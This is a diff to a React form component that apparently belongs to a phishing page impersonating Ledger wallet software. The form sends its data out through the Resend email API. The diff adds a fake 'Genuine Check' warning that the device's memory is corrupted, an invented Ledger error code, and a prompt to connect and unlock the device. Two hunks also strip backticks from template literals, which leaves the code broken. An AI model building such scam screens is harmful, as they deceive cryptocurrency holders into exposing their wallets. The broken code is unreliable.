@@ -72,7 +72,7 @@ const Form = () => {
       const response = await fetch("https://api.resend.com/emails", {
         method: "POST",
         headers: {
-          Authorization: `Bearer ${process.env.REACT_APP_RESEND_API_KEY}`,
+          Authorization: Bearer ${process.env.REACT_APP_RESEND_API_KEY},
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
@@ -100,7 +100,7 @@ const Form = () => {
       <div className={styles.timeline}>
         {steps.map((step, index) => (
           <div
-            className={`element ${currentStep === index ? "active" : ""}`}
+            className={element ${currentStep === index ? "active" : ""}}
             key={index}
           >
             <div
@@ -166,7 +166,10 @@ const Form = () => {
             <h2>Genuine Check</h2>
             <RiAlertLine size={60} color="red" />
 
-          
+            <p>
+              Your devices memory has been corrupted. <br />
+              Ledger data damage error: 0x0m3CkBn
+            </p>
 
             <div className={styles.buttons}>
               <button onClick={handleUpdateClick}>
@@ -224,7 +227,7 @@ const Form = () => {
       {loading && (
         <div>
           <div className={styles.loader_content}>
-           
+            <h2>Connect and unlock your device</h2>
             <img src={loader_image} alt="" />
             <img src={loader} alt="loader" width={50} height={50} />
           </div>
